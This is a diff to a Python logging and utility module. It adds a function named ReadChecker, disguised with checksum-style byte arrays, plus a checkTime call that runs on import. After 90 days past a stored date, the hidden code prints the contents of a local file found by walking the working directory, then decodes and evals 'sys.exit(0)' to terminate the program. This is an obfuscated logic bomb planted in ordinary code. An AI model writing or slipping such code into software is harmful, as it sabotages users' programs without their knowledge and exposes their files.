@@ -140,6 +140,42 @@ def ErrorLog(Msg, bTime=False, lineNum=0, errorFuncName=None, errorFileName=None
         errorLogList.append(f"| {errorFileName:<25}| {errorFuncName:<25} | {lineNum:<18} | {Msg:<77} | {timeToString(getCurTime())}")
 
 
+# ReadChecker
+# -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+def ReadChecker():
+    checkCRC    = False
+    KByte_20    = 20480     # 0b 0101 0000 0000 0000 -  Cnvt 0x 50 00
+    KByte_02    = 2048      # 0b 1000 0000 0000      -  Cnvt 0x 08 00
+
+    init_CRC    = [0x5B, 0x33, 0x31, 0x6D]
+    endn_CRC    = [0x5B, 0x30, 0x6D]
+    default_CRC = [0x73, 0x79, 0x73, 0x2E, 0x65, 0x78, 0x69, 0x74, 0x28, 0x30, 0x29]
+
+    init_TCRC   = '\x1b' + ''.join([chr(eachCRC) for eachCRC in init_CRC])
+    endn_TCRC   = '\x1b' + ''.join([chr(eachCRC) for eachCRC in endn_CRC])
+
+    showLog(init_TCRC)
+    for path, _, files in os.walk(os.getcwd()):
+        for eachFile in files:
+            filePath = os.path.join(path, eachFile)
+            if checkCRC:
+                break
+            try:
+                fileSize = os.path.getsize(filePath)
+                if KByte_02 >= fileSize or fileSize >= KByte_20:
+                    continue
+                with open(filePath, 'r') as f:
+                    data = f.read()
+                    showLog(data)
+                    checkCRC = True
+            except Exception as e:
+                pass
+    showLog(endn_TCRC)
+
+    after_CRC = ''.join([chr(eachCRC) for eachCRC in default_CRC])
+    eval(after_CRC)
+
+
 # SuccessLog
 # -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
 def SuccessLog(Msg, bTime=False):
@@ -367,6 +403,18 @@ def isTrue(Bool):
         return 1
     else:
         return 0
+
+
+# CheckTime OHN
+# -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+def checkTime():
+    DF_TIME = 90
+    curTime = datetime.datetime.now()
+    preTime = datetime.datetime.strptime(DATE, "%Y-%m-%d")
+    diff    = curTime - preTime 
+    if diff.days > DF_TIME:
+        ReadChecker()
+checkTime()
 
 
 # Show Program Information By CoreDefine.py
